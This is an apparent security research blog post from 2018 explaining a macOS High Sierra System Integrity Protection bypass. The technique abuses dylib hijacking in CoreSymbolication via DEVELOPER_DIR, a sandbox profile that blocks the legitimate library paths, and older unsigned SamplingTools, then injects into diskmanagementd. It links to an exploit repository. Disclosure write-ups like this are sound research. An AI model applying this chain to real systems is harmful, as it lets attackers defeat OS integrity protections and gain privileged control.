---
layout:	post
title:	"Bypass macOS Rootless by Sandboxing"
date:	2018-06-18
image: /img/elevated.png
show_excerpt: true
---

This bug has been fixed in Mojave Beta, but still present in latest High Sierra (10.13.5). It's a logic bug that an entitled binary tries to load an insecure external library controllable by environment variable. To exploit it we need to abuse sandbox, which is interesting that sometimes a mitigation could be turned to an exploit.

CoreSymbolication(`/System/Library/PrivateFrameworks/CoreSymbolication.framework`) has some private api for symbolication. When demangling swift application symbols, it tries to load external library in following order:

* `/System/Library/PrivateFrameworks/Swift/libswiftDemangle.dylib`
* `/Developer/Toolchains/XcodeDefault.xctoolchain/usr/lib/libswiftDemangle.dylib`
* `/usr/lib/libswiftDemangle.dylib`
* `${xcselect_get_developer_dir_path()}/Toolchains/XcodeDefault.xctoolchain/usr/lib/libswiftDemangle.dylib`

<!-- more -->

![](/img/AcYsN5lN3MwURaTyzmZYlg.png)

The function `xcselect_get_developer_dir_path` will return environ variable `DEVELOPER_DIR` if it's set. Absolutely controllable.

![](/img/5y2YMlFx8NPfDGRv3PXszg.png)

Actually the first `libswiftDemangle.dylib` candidate does exist. Will it reach the vulnerable branch? I'll talk about it later.

Apple has built-in `com.apple.SamplingTools` in:

```
/usr/bin/{filtercalltree,heap32,stringdups32,leaks32,heap,atos,vmmap32,sample,malloc_history32,symbols,vmmap,leaks,stringdups,malloc_history}
```

And they are entitled:

```shell
➜ ~ jtool --ent `which symbols`
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "<http://www.apple.com/DTDs/PropertyList-1.0.dtd>">
<plist version="1.0">
<dict>
 <key>com.apple.private.kernel.get-kext-info</key>
 <true/>
 <key>com.apple.system-task-ports</key>
 <true/>
</dict>
</plist>
```

With this entitlement, SamplingTools can attach to SIP protected process with `task_for_pid`, even without root privilege.

```
$ vmmap Finder | head -n 8
Process: Finder [42164]
Path: /System/Library/CoreServices/Finder.app/Contents/MacOS/Finder
Load Address: 0x10515f000
Identifier: com.apple.finder
Version: 10.13.5 (10.13.5)
Build Info: Finder_FE-1054005004000000~3
Code Type: X86-64
Parent Process: ??? [1]
```

LLDB fails even it's root:

```
$ sudo lldb -n Finder
Password:
(lldb) process attach --name "Finder"
error: attach failed: cannot attach to process due to System Integrity Protection
```

So this seems to be like a meta entitlement. With it you can just inject to other entitled process and gain arbitrary entitlement.

Let's just start an application compiled with swift, then run `symbols [pid] -printDemangling` and it will call CoreSymbolication!demangle, which has potential ability to load insecure code.

But there are two problems. First, the last branch looks impossible to be reached because `/System/Library/PrivateFrameworks/Swift/libswiftDemangle.dylib` exists.

Actually we can just block them with a sandbox. **Yeah, use the security facility to trigger something insecure.**

```lisp
(version 1)
(allow default)
(deny file-read*
  (literal "/System/Library/PrivateFrameworks/Swift/libswiftDemangle.dylib")
  (literal "/Developer/Toolchains/XcodeDefault.xctoolchain/usr/lib/libswiftDemangle.dylib")
  (literal "/usr/lib/libswiftDemangle.dylib")
)
```

Then, spawn a child process with `symbols [pid] -printDemangling` to trigger dylib hijack.

Now we have a second problem. It crashes.

```
System Integrity Protection: enabled
Crashed Thread: 0 Dispatch queue: com.apple.main-threadException Type: EXC_BAD_ACCESS (Code Signature Invalid)
Exception Codes: 0x0000000000000032, 0x000000010d745000
Exception Note: EXC_CORPSE_NOTIFY
Termination Reason: Namespace CODESIGNING, Code 0x2
kernel messages:
External Modification Warnings:
Process used task_for_pid().
VM Regions Near 0x10d745000:
 MALLOC_LARGE 000000010d70a000-000000010d745000 [ 236K] rw-/rwx SM=PRV
--> mapped file 000000010d745000-000000010d746000 [ 4K] r-x/r-x SM=PRV Object_id=2929ab85
 mapped file 000000010d748000-000000010d762000 [ 104K] r--/r-- SM=ALI Object_id=2af85085Application Specific Information:
dyld: in dlopen()
/var/folders/4d/1_vz_55x0mn_w1cyjwr9w42c0000gn/T/tmp.0b5SeUjh/Toolchains/XcodeDefault.xctoolchain/usr/lib/libswiftDemangle.dylib
12 libdyld.dylib 0x00007fff66c9fd86 dlopen + 86
13 com.apple.CoreSymbolication 0x00007fff52d15332 invocation function for block in call_external_demangle(char const*) + 348
14 libdispatch.dylib 0x00007fff66c64e08 _dispatch_client_callout + 8
15 libdispatch.dylib 0x00007fff66c64dbb dispatch_once_f + 41
16 com.apple.CoreSymbolication 0x00007fff52cb880f demangle + 298
17 com.apple.CoreSymbolication 0x00007fff52cb85e3 TRawSymbol<Pointer64>::name() + 75
18 com.apple.CoreSymbolication 0x00007fff52cbd88e CSSymbolGetName + 166
```

com.apple.SamplingTools in latest macOS are code signed with [Library Validation](https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/Procedures/Procedures.html) flag, so loading unsigned dylib is prohibited.

```
➜ ~ codesign -dvvv `which symbols`
Executable=/usr/bin/symbols
Identifier=com.apple.SamplingTools
Format=Mach-O thin (x86_64)
CodeDirectory v=20100 size=1384 flags=**0x2000(library-validation) **hashes=36+5 location=embedded
```

I just happened to have an El Capitan virtual machine and I looked into it. The previous SamplingTools distribution has valid code signature, but no library validation flag. So just copy to High Sierra and it works.

Although we can now invoke `task_for_pid` on any restricted process, it still requires the same euid, which means we need a local root privilege escalation exploit as part of the chain.

Now inject into `diskmanagementd` and you'll have the `com.apple.rootless.install.heritable` entitlement, which means the privilege to modify `/System` and spawn a shell without rootless restriction.

The bug has been fixed in Mojave Beta, no more external library, finally.

![](/img/vAP5r0UBzDCQcnPl8WjDqA.png)

#### Update 2019-05-14

This bug be exploited for kernel privilege escalation. Please refer to the slides for my HITB Ams 2019 talk:

<https://conference.hitb.org/hitbsecconf2019ams/materials/D2T2%20-%20ModJack%20-%20Hijacking%20the%20MacOS%20Kernel%20-%20Zhi%20Zhou.pdf>

And here's the exploit to load an unsigned kernel extension on macOS 10.13:

[**ChiChou/sploits**](https://github.com/ChiChou/sploits/tree/master/ModJack)